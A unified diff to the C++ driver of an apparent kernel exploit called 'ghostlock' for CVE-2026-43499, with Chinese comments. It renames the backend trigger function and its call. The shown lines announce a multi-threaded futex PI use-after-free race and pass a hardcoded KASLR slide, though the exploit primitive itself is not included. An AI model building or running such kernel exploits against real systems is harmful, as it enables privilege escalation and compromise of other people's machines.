@@ -22,8 +22,10 @@ using namespace ghostlock;
 
 // 声明底层真实的漏洞触发函数（通常定义在 cve_2026_43499_backend.cpp 中）
 namespace ghostlock::runtime {
-    extern int trigger_ghostlock_exploit_core(uint64_t slide);
+    // 直接让其承接底层 cve_2026_43499_backend.cpp 的真实全局原语函数名
+    extern int run_ghostlock_exploit_backend(uint64_t slide);
 }
+
 
 int main(int argc, char **argv) {
     printf("[*] =====================================================\n");
@@ -46,9 +48,9 @@ int main(int argc, char **argv) {
 
     // 3. 触发多线程竞争原语与任意内存读写覆写机制
     printf("[*] Launching multi-threaded futex PI UAF race attack...\n");
-    
+   
     // 直接调用漏洞后端击穿内核流
-    if (runtime::trigger_ghostlock_exploit_core(my_hardcoded_slide) != 0) {
+    if (runtime::run_ghostlock_exploit_backend(my_hardcoded_slide) != 0) {
         printf("[-] Exploit failed during kernel memory modification.\n");
         return 1;
     }
